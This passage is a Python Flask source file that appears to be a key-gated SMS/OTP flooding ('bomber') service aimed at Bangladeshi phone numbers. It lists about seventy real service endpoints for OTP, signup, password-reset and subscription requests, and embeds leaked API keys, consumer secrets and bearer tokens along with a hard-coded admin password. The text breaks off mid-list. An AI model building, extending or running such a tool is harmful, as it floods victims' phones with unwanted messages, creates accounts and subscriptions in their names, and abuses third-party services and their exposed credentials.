#!/usr/bin/env python3

from flask import Flask, request, jsonify, render_template_string, render_template
from werkzeug.security import generate_password_hash, check_password_hash
import requests
import json
import time
import random
import os
from datetime import datetime, timedelta
from functools import wraps
import urllib3

app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== কনফিগারেশন ====================
CONFIG_FILE = "keys.config"
STATS_FILE = "stats.json"

# এডমিন পাসওয়ার্ড হ্যাশ (আপনার আসল পাসওয়ার্ড: admin@2026)
ADMIN_HASH = generate_password_hash("admin@2026")

VALID_KEYS = {}
STATS = {"total_requests": 0, "total_success": 0, "total_failed": 0, "logs": []}


# ==================== ফোন নম্বর ফরম্যাটিং (Fail-Proof) ====================
def format_phone(phone: str, format_type: str) -> str:
    """যেকোনো ইনপুট থেকে সঠিক নাম্বার বের করে ফরম্যাট করবে"""
    digits = ''.join(filter(str.isdigit, phone))
    
    # ইনপুট থেকে শুধু মেইন ১০ ডিজিট বের করা (0 বাদে)
    if len(digits) >= 10:
        core_10 = digits[-10:]
    else:
        core_10 = digits
    
    # বেস ফরম্যাট
    last_11 = "0" + core_10
    last_10 = core_10
    
    formats = {
        "as_is": last_11,                           # 019XXXXXXXX
        "with_plus_88": f"+88{last_11}",            # +88019XXXXXXXX
        "with_880": f"88{last_11}",                 # 88019XXXXXXXX
        "remove_leading_zero": last_10,             # 19XXXXXXXX
        "with_plus_88_hyphen": f"+88-{last_11}",    # +88-019XXXXXXXX
        "with_880_no_0": f"880{last_10}",           # 88019XXXXXXXX
        "with_880_plus": f"+880{last_11}",          # +88019XXXXXXXX
        "with_plus_880": f"+880{last_10}",          # +88019XXXXXXXX
    }
    return formats.get(format_type, last_11)


# ==================== API লিস্ট ====================
def get_all_apis():
    return [
        # === 1. RedX API গুলো ===
        {
            "name": "RedX Signup",
            "url": "https://api.redx.com.bd:443/v1/user/signup",
            "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
            "payload": {"name": "User", "service": "redx", "phoneNumber": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "RedX Merchant Registration",
            "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phoneNumber": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 2. KhaasFood ===
        {
            "name": "KhaasFood OTP",
            "url": "https://api.khaasfood.com/api/app/one-time-passwords/token",
            "headers": {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
            "payload": {"username": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 3. Bioscope ===
        {
            "name": "Bioscope Login",
            "url": "https://api-dynamic.bioscopelive.com/v2/auth/login",
            "headers": {"Content-Type": "application/json"},
            "params": {"country": "BD", "platform": "web", "language": "en"},
            "payload": {"number": "{phone}"},
            "phone_format": "with_plus_88"
        },
        
        # === 4. Bikroy ===
        {
            "name": "Bikroy Phone Login",
            "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login",
            "headers": {"Accept": "application/json", "Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 5. Proiojon ===
        {
            "name": "Proiojon Signup",
            "url": "https://billing.proiojon.com/api/v1/auth/sign-up",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"name":"TestUser","phone":"{phone}","email":"test{phone}@test.com","password":"password123"}',
            "phone_format": "as_is"
        },
        {
            "name": "Proiojon Login",
            "url": "https://billing.proiojon.com/api/v1/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "login_type": "otp"},
            "phone_format": "with_plus_88"
        },
        
        # === 6. BeautyBooth ===
        {
            "name": "BeautyBooth Register",
            "url": "https://admin.beautybooth.com.bd/api/v2/auth/register",
            "headers": {"Content-Type": "application/json"},
            "payload": {"value": "{phone}", "type": "phone"},
            "phone_format": "as_is"
        },
        
        # === 7. Medha ===
        {
            "name": "Medha OTP",
            "url": "https://developer.medha.info/api/send-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "is_register": "1"},
            "phone_format": "with_880"
        },
        
        # === 8. Deeptoplay ===
        {
            "name": "Deeptoplay Login",
            "url": "https://api.deeptoplay.com/v2/auth/login",
            "headers": {"Content-Type": "application/json"},
            "params": {"country": "BD", "platform": "web", "language": "en"},
            "payload": {"number": "{phone}"},
            "phone_format": "with_plus_88"
        },
        
        # === 9. Robi ===
        {
            "name": "Robi OTP",
            "url": "https://webapi.robi.com.bd/v1/send-otp",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test"},
            "payload": {"phone_number": "{phone}", "type": "doorstep"},
            "phone_format": "as_is"
        },
        {
            "name": "Robi NLL",
            "url": "https://da-api.robi.com.bd/da-nll/otp/send",
            "headers": {"Content-Type": "application/json"},
            "payload": {"msisdn": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "Robi WiFi",
            "url": "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"login": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "Robi Account Register",
            "url": "https://webapi.robi.com.bd/v1/account/register/otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone_number": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 10. Arogga ===
        {
            "name": "Arogga SMS",
            "url": "https://api.arogga.com/auth/v1/sms/send",
            "headers": {"Content-Type": "multipart/form-data"},
            "params": {"f": "web", "b": "Chrome", "v": "135.0.0.0", "os": "Windows", "osv": "10"},
            "payload": {"mobile": "{phone}", "fcmToken": "", "referral": ""},
            "phone_format": "as_is"
        },
        {
            "name": "Arogga App SMS",
            "url": "https://api.arogga.com/auth/v1/sms/send",
            "headers": {"Content-Type": "multipart/form-data"},
            "params": {"f": "app", "v": "6.2.7", "os": "android", "osv": "33"},
            "payload": {"mobile": "{phone}", "fcmToken": "", "referral": ""},
            "phone_format": "as_is"
        },
        
        # === 11. MyGP ===
        {
            "name": "MyGP OTP",
            "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone}",
            "headers": {"Accept": "application/json", "Content-Type": "application/json"},
            "phone_format": "as_is"
        },
        {
            "name": "MyGP Cinematic OTP",
            "url": "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}',
            "phone_format": "as_is"
        },
        {
            "name": "MyGP Send OTP",
            "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/",
            "headers": {"Content-Type": "application/json"},
            "phone_format": "as_is"
        },
        
        # === 12. BDSTall ===
        {
            "name": "BDSTall OTP",
            "url": "https://www.bdstall.com/userRegistration/save_otp_info/",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 13. BCS Exam ===
        {
            "name": "BCS Exam OTP",
            "url": "https://bcsexamaid.com/api/generateotp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}", "softtoken": "Rifat.Admin.2022"},
            "phone_format": "as_is"
        },
        
        # === 14. DoctorLive ===
        {
            "name": "DoctorLive OTP",
            "url": "https://doctorlivebd.com/api/patient/auth/otpsend",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"country_code": "880", "mobile": "{phone}"},
            "phone_format": "remove_leading_zero"
        },
        
        # === 15. Sheba ===
        {
            "name": "Sheba OTP",
            "url": "https://accountkit.sheba.xyz/api/shoot-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}", "app_id": "8329815A6D1AE6DD", "api_token": "5zJLGsTnz03Jor5Jag18osMoJUyyWNc5kKZNOe7JGmxIpx8zVHRBWni2zYPM"},
            "phone_format": "with_plus_88"
        },
        
        # === 16. Apex4U ===
        {
            "name": "Apex4U Login",
            "url": "https://api.apex4u.com/api/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phoneNumber": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 17. Sindabad ===
        {
            "name": "Sindabad OTP",
            "url": "https://offers.sindabad.com/api/mobile-otp",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgd2luZG93cyBudCAxMDAgd2luNjQgeDY0IGFwcGxld2Via2l0NTM3MzYga2h0bWwgbGlrZSBnZWNrbyBjaHJvbWUxMzUwMDAgc2FmYXJpNTM3MzZiYW5kb3IwYzVjOTQ3YmQ2MDVhMDQzMGJlN2QwNWQ1NjkyMTFkNA=="},
            "payload": {"key": "0c5c947bd605a0430be7d05d569211d4", "mobile": "{phone}"},
            "phone_format": "with_plus_88"
        },
        
        # === 18. Kirei ===
        {
            "name": "Kirei OTP",
            "url": "https://app.kireibd.com/api/v2/send-login-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"email": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 19. Shikho ===
        {
            "name": "Shikho SMS",
            "url": "https://api.shikho.com/auth/v2/send/sms",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "type": "student", "auth_type": "signup", "vendor": "shikho"},
            "phone_format": "with_880"
        },
        {
            "name": "Shikho Login",
            "url": "https://api.shikho.com/auth/v2/send/sms",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "type": "student", "auth_type": "login", "vendor": "shikho"},
            "phone_format": "with_880"
        },
        
        # === 20. Circle ===
        {
            "name": "Circle Signup",
            "url": "https://reseller.circle.com.bd/api/v2/auth/signup",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"name":"{phone}","email_or_phone":"{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}',
            "phone_format": "with_plus_88"
        },
        
        # === 21. BDTickets ===
        {
            "name": "BDTickets Auth",
            "url": "https://api.bdtickets.com:20100/v1/auth",
            "headers": {"Content-Type": "application/json"},
            "payload": {"createUserCheck": True, "phoneNumber": "{phone}", "applicationChannel": "WEB_APP"},
            "phone_format": "with_plus_88"
        },
        
        # === 22. Grameenphone ===
        {
            "name": "Grameenphone OTP",
            "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "email": "", "language": "en"},
            "phone_format": "as_is"
        },
        {
            "name": "Grameenphone Web OTP",
            "url": "https://weblogin.grameenphone.com/backend/api/v1/otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"msisdn": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "Grameenphone FI OTP",
            "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"msisdn": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "GP Offer OTP",
            "url": "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"msisdn": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "GPay Signup",
            "url": "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
            "headers": {"Content-Type": "application/json"},
            "payload": {"deviceId": "35{phone}30", "msisdn": "{phone}", "tran_type": "OTPREQSIGNUP"},
            "phone_format": "as_is"
        },
        
        # === 23. RFL BestBuy ===
        {
            "name": "RFL BestBuy Login",
            "url": "https://rflbestbuy.com/api/login/",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ=="},
            "params": {"lang_code": "en", "currency_code": "BDT"},
            "payload": {"otp_verify": False, "password1": "Riyaz@123", "phone": "{phone}", "storefront_id": "3"},
            "phone_format": "as_is"
        },
        
        # === 24. Chorki ===
        {
            "name": "Chorki Login",
            "url": "https://api-dynamic.chorki.com/v2/auth/login",
            "headers": {"Content-Type": "application/json"},
            "params": {"country": "BD", "platform": "web", "language": "en"},
            "payload": {"number": "{phone}"},
            "phone_format": "with_plus_88"
        },
        
        # === 25. Hishab Express ===
        {
            "name": "Hishab Express Login",
            "url": "https://api.hishabexpress.com/login/status",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"msisdn": "{phone}", "hash": "Hello"},
            "phone_format": "as_is"
        },
        
        # === 26. Chorcha ===
        {
            "name": "Chorcha Auth Check",
            "url": "https://mujib.chorcha.net/auth/check",
            "headers": {"x-chorcha-mode": "prod", "x-chorcha-platform": "web", "Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "Chorcha Register",
            "url": "https://mujib.chorcha.net/auth/register",
            "headers": {"Content-Type": "application/json"},
            "payload": {"name": "User", "phone": "{phone}", "password": "Password123", "type": "SSC", "level": "SSC_25", "school": "school"},
            "phone_format": "as_is"
        },
        
        # === 27. Wafilife ===
        {
            "name": "Wafilife OTP",
            "url": "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp",
            "headers": {"Content-Type": "application/json"},
            "params": {"consumer_key": "ck_e8c5b4a69729dd913dce8be03d7878531f6511ff", "consumer_secret": "cs_f866e5c6543065daa272504c2eea71044579cff3"},
            "payload": {"p": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 28. Chardike ===
        {
            "name": "Chardike OTP",
            "url": "https://api.chardike.com/api/otp/send",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "otp_type": "login"},
            "phone_format": "as_is"
        },
        
        # === 29. E-TestPaper ===
        {
            "name": "E-TestPaper OTP",
            "url": "https://prod.etestpaper.net/api/v4/auth/otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "recaptcha": "668be73dcad2999a957ff440"},
            "phone_format": "as_is"
        },
        {
            "name": "E-TestPaper Signup",
            "url": "https://prod.etestpaper.net/api/auth/signup",
            "headers": {"Content-Type": "application/json"},
            "payload": {"name": "User", "phone": "{phone}", "level": "HSC 2025", "group": "Science", "password": "Password123", "repeat_password": "Password123"},
            "phone_format": "as_is"
        },
        
        # === 30. Applink ===
        {
            "name": "Applink OTP",
            "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
            "headers": {"Content-Type": "application/json"},
            "payload": {"msisdn": "{phone}"},
            "phone_format": "with_880"
        },
        
        # === 31. Priyoshikkhaloy ===
        {
            "name": "Priyoshikkhaloy",
            "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"mobile": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 32. Kabbik ===
        {
            "name": "Kabbik OTP",
            "url": "https://api.kabbik.com/v1/auth/otpnew",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test"},
            "raw_body": '{"msisdn":"{phone}","currentTimeLong":1678900000000,"passKey":"qOQNBtVmoTTPVmfn"}',
            "phone_format": "with_880"
        },
        
        # === 33. Salextra ===
        {
            "name": "Salextra",
            "url": "https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "payload": {"username": "{phone}", "loginType": "MOBILE"},
            "phone_format": "as_is"
        },
        
        # === 34. Sundora ===
        {
            "name": "Sundora Register",
            "url": "https://api.sundora.com.bd/api/user/customer/",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"customer":{"email":"user{phone}@gmail.com","password":"#bUV?\'3*N#7N}.g","password_confirmation":"#bUV?\'3*N#7N}.g","phone":"+880{phone}","draft_order_id":null,"first_name":"User","last_name":"Test","note":{"birthday":"","gender":"male"},"withTimeout":true,"newsletter_email":true,"newsletter_sms":true}}',
            "phone_format": "with_880"
        },
        
        # === 35. Bajistar ===
        {
            "name": "Bajistar OTP",
            "url": "https://bajistar.com:1443/public/api/v1/getOtp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"recipient": "{phone}"},
            "phone_format": "with_880"
        },
        
        # === 36. Doctime ===
        {
            "name": "Doctime OTP",
            "url": "https://api.doctime.com.bd/api/authenticate",
            "headers": {"Content-Type": "application/json"},
            "payload": {"contact_no": "{phone}", "country_calling_code": "88"},
            "phone_format": "as_is"
        },
        
        # === 37. Meenabazar ===
        {
            "name": "Meenabazar OTP",
            "url": "https://meenabazardev.com/api/mobile/front/send/otp",
            "headers": {"Content-Type": "application/json"},
            "params": {"type": "login"},
            "payload": {"CellPhone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 38. Medeasy ===
        {
            "name": "Medeasy OTP",
            "url": "https://api.medeasy.health/api/send-otp/{phone}/",
            "headers": {"Content-Type": "application/json"},
            "phone_format": "with_plus_88"
        },
        
        # === 39. Iqra Live ===
        {
            "name": "Iqra Live OTP",
            "url": "http://apibeta.iqra-live.com/api/v1/sent-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 40. Chokrojan ===
        {
            "name": "Chokrojan OTP",
            "url": "https://chokrojan.com/api/v1/passenger/login/mobile",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile_number": "{phone}", "otp_token": "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"},
            "phone_format": "as_is"
        },
        
        # === 41. Shomvob ===
        {
            "name": "Shomvob OTP",
            "url": "https://backend-api.shomvob.co/api/v2/otp/phone",
            "headers": {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test"},
            "params": {"is_retry": 0},
            "payload": {"phone": "{phone}"},
            "phone_format": "with_880"
        },
        
        # === 42. BDJobs ===
        {
            "name": "BDJobs Create Account",
            "url": "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"firstName":"User","lastName":"","gender":"M","email":"user{phone}@gmail.com","userName":"{phone}","password":"Password@123","confirmPassword":"Password@123","mobile":"{phone}","countryCode":"88"}',
            "phone_format": "as_is"
        },
        
        # === 43. Ultimate Organic ===
        {
            "name": "Ultimate Organic Register",
            "url": "https://ultimateasiteapi.com/api/register-customer",
            "headers": {"Content-Type": "application/json"},
            "payload": {"customer_name": "User", "customer_password": "12345678", "customer_password_confirmation": "12345678", "customer_email": "{phone}@gmail.com", "customer_contact": "{phone}", "customer_dob": "2000-01-01", "customer_gender": "male"},
            "phone_format": "as_is"
        },
        {
            "name": "Ultimate Organic Forget",
            "url": "https://ultimateasiteapi.com/api/forget-customer-password",
            "headers": {"Content-Type": "application/json"},
            "payload": {"user_input": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 44. Foodaholic ===
        {
            "name": "Foodaholic Forgot Password",
            "url": "https://foodaholic.com.bd/api/v1/auth/forgot-password",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "with_plus_88"
        },
        {
            "name": "Foodaholic Signup",
            "url": "https://foodaholic.com.bd/api/v1/auth/sign-up",
            "headers": {"Content-Type": "application/json"},
            "payload": {"f_name": "User", "l_name": "Name", "phone": "{phone}", "email": "user@gmail.com", "password": "Password123", "ref_code": ""},
            "phone_format": "with_plus_88"
        },
        
        # === 45. KFC BD ===
        {
            "name": "KFC BD Register",
            "url": "https://api.kfcbd.com/register",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"name":"User","email":"user{phone}@gmail.com","mobile":"{phone}","device_token":"test","otp":null}',
            "phone_format": "as_is"
        },
        
        # === 46. Eonbazar ===
        {
            "name": "Eonbazar Register",
            "url": "https://app.eonbazar.com/api/auth/register",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"mobile":"{phone}","name":"User Test","password":"Password123","email":"user{phone}@gmail.com"}',
            "phone_format": "as_is"
        },
        {
            "name": "Eonbazar Login",
            "url": "https://app.eonbazar.com/api/auth/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"method": "otp", "mobile": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 47. Eat-Z ===
        {
            "name": "Eat-Z App Connect",
            "url": "https://api.eat-z.com/auth/customer/app-connect",
            "headers": {"Content-Type": "application/json"},
            "payload": {"username": "{phone}"},
            "phone_format": "with_plus_880"
        },
        
        # === 48. Osudpotro ===
        {
            "name": "Osudpotro OTP",
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}", "deviceToken": "app", "language": "bn", "os": "android"},
            "phone_format": "with_plus_88_hyphen"
        },
        
        # === 49. Kormi24 ===
        {
            "name": "Kormi24 GraphQL",
            "url": "https://api.kormi24.com/graphql",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"operationName":"sendOTP","variables":{"type":1,"mobile":"{phone}","hash":"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180"},"query":"mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"}',
            "phone_format": "as_is"
        },
        
        # === 50. Shwapno ===
        {
            "name": "Shwapno Auth",
            "url": "https://www.shwapno.com/api/auth",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phoneNumber": "{phone}"},
            "phone_format": "with_plus_88"
        },
        
        # === 51. Quizgiri ===
        {
            "name": "Quizgiri OTP",
            "url": "https://developer.quizgiri.xyz:443/api/v2.0/send-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}", "country_code": "+880"},
            "phone_format": "as_is"
        },
        
        # === 52. Banglalink MyBL ===
        {
            "name": "Banglalink MyBL OTP",
            "url": "https://myblapi.banglalink.net/api/v1/send-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phone": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "Banglalink eShop OTP",
            "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"type": "phone", "phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 53. Walton Plaza ===
        {
            "name": "Walton Plaza GraphQL",
            "url": "https://api.waltonplaza.com.bd/graphql",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"operationName":"createCustomerOtp","variables":{"auth":{"countryCode":"880","deviceUuid":"test-device","phone":"{phone}"},"device":null},"query":"mutation createCustomerOtp($auth: CustomerAuthInput!, $device: DeviceInput) { createCustomerOtp(auth: $auth, device: $device) { message result { id __typename } statusCode __typename } }"}',
            "phone_format": "as_is"
        },
        
        # === 54. PBS ===
        {
            "name": "PBS OTP",
            "url": "https://apialpha.pbs.com.bd/api/OTP/generateOTP",
            "headers": {"Content-Type": "application/json"},
            "payload": {"userPhone": "{phone}", "otp": ""},
            "phone_format": "as_is"
        },
        
        # === 55. Aarong ===
        {
            "name": "Aarong GraphQL",
            "url": "https://mcprod.aarong.com/graphql",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"query":"mutation generateCustomerToken($email: String!, $password: String!, $type: String!, $mobile_number: String!) { generateCustomerToken(email: $email password: $password type: $type mobile_number: $mobile_number) { token message } }","variables":{"email":"","password":"","type":"mobile_number","mobile_number":"{phone}"}}',
            "phone_format": "as_is"
        },
        
        # === 56. Sundarban Courier ===
        {
            "name": "Sundarban Courier GraphQL",
            "url": "https://api-gateway.sundarbancourierltd.com/graphql",
            "headers": {"Content-Type": "application/json"},
            "raw_body": '{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}',
            "phone_format": "as_is"
        },
        
        # === 57. QuizTime ===
        {
            "name": "QuizTime OTP",
            "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"country_code": "+88", "phone": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 58. DressUp ===
        {
            "name": "DressUp OTP",
            "url": "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp",
            "headers": {"Content-Type": "application/json"},
            "payload": {"country_code": "+880", "mobile": "{phone}", "type": "login", "whatsapp": False},
            "phone_format": "remove_leading_zero"
        },
        
        # === 59. Ghoori Learning ===
        {
            "name": "Ghoori Learning OTP",
            "url": "https://api.ghoorilearning.com/api/auth/signup/otp",
            "headers": {"Content-Type": "application/json"},
            "params": {"_app_platform": "web"},
            "payload": {"mobile_no": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 60. Garibook ===
        {
            "name": "Garibook Login",
            "url": "https://api.garibookadmin.com/api/v3/user/login",
            "headers": {"Content-Type": "application/json"},
            "payload": {"mobile": "{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"},
            "phone_format": "as_is"
        },
        
        # === 61. Fabrilife ===
        {
            "name": "Fabrilife Signup",
            "url": "https://fabrilife.com/api/wp-json/wc/v2/user/register",
            "headers": {"Content-Type": "application/json"},
            "payload": {"name": "User Test", "email": "{phone}@gmail.com", "phone": "{phone}", "password": "Password@123"},
            "phone_format": "as_is"
        },
        {
            "name": "Fabrilife OTP",
            "url": "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{phone}",
            "headers": {"otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW", "Content-Type": "application/json"},
            "phone_format": "as_is"
        },
        
        # === 62. BTCL ===
        {
            "name": "BTCL BDIA OTP",
            "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "params": {"moduleID": "1"},
            "payload": {"actionType": "otpSend", "mobileNo": "{phone}"},
            "phone_format": "remove_leading_zero"
        },
        {
            "name": "BTCL PhoneBill Register",
            "url": "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
            "headers": {"Content-Type": "application/json"},
            "payload": {"phoneNbr": "{phone}", "email": "", "OTPType": 1, "userName": ""},
            "phone_format": "as_is"
        },
        {
            "name": "BTCL PhoneBill Login",
            "url": "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
            "headers": {"Content-Type": "application/json"},
            "payload": {"OTPType": 15, "userName": "{phone}", "isNewPhoneOrEmail": False},
            "phone_format": "as_is"
        },
        
        # === 63. AIBL Banking ===
        {
            "name": "AIBL Banking OTP",
            "url": "https://cihno.aibl.com.bd/cihno-service/api/v1/public/user/send/otp",
            "headers": {"Content-Type": "application/json", "authorization": "Otp bnVsbA=="},
            "payload": {"countryId": "19", "mobileNumber": "{phone}", "purpose": "registration"},
            "phone_format": "as_is"
        },
        
        # === 64. JSL Global / Jatri ===
        {
            "name": "JSL Global OTP",
            "url": "https://user-api.jslglobal.co:444/v1/send-otp",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "raw_body": "phone=+88{phone}&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj",
            "phone_format": "as_is"
        },
        
        # === 65. Toybox ===
        {
            "name": "Toybox Live",
            "url": "https://api.toybox.live/bdapps_handler.php",
            "headers": {"Content-Type": "application/json"},
            "payload": {"Operation": "CreateSubscription", "MobileNumber": "88{phone}", "PackageID": 100},
            "phone_format": "as_is"
        },
        
        # === 66. Easy.com.bd ===
        {
            "name": "Easy.com.bd Registration",
            "url": "https://core.easy.com.bd/api/v1/registration",
            "headers": {"Content-Type": "application/json", "device-key": "9351e1013f4bd9d0ca11efd63746668f"},
            "raw_body": '{"social_login_id":"","name":"User","email":"user{phone}@example.com","mobile":"{phone}","password":"Password123","password_confirmation":"Password123","device_key":"9351e1013f4bd9d0ca11efd63746668f"}',
            "phone_format": "as_is"
        },
        
        # === 67. Hishabee ===
        {
            "name": "Hishabee OTP",
            "url": "https://app.hishabee.business/api/V2/otp/send",
            "headers": {"Content-Type": "application/json"},
            "params": {"mobile_number": "{phone}"},
            "phone_format": "as_is"
        },
        
        # === 68. Cineplex ===
        {
            "name": "Cineplex Resend OTP",
            "url": "https://cineplex-ticket-api.cineplexbd.com/api/v1/otp-resend",
            "headers": {"Content-Type": "application/json"},
            "payload": {"r_token": "jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6", "msisdn": "{phone}"},
            "phone_format": "as_is"
        },
        {
            "name": "Cineplex Register",
            "url": "https://cineplex-ticket-api.cineplexbd.com/api/v1/register",
            "headers": {"Content-Type": "application/json", "appsource": "web"},
            "raw_body": '{"name":"Test User {random}","msisdn":"{phone}","email":"user{random}@example.com","gender":"2","password":"@Test1234","confirm_password":"@Test1234","r_token":"{random}"}',
            "phone_format": "as_is"
        },
        
        # === 69. Fundesh ===
        {
            "name": "Fundesh OTP",
            "url": "https://fundesh.com.bd/api/auth/generateOTP",
            "headers": {"Content-Type": "application/json"},
            "payload": {"msisdn": "{phone}", "service_key": ""},
            "phone_format": "as_is"
        },
        
        # === 70. Paperfly ===
        {
            "name": "Paperfly OTP",
            "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
            "headers": {"Content-Type": "application/json"},
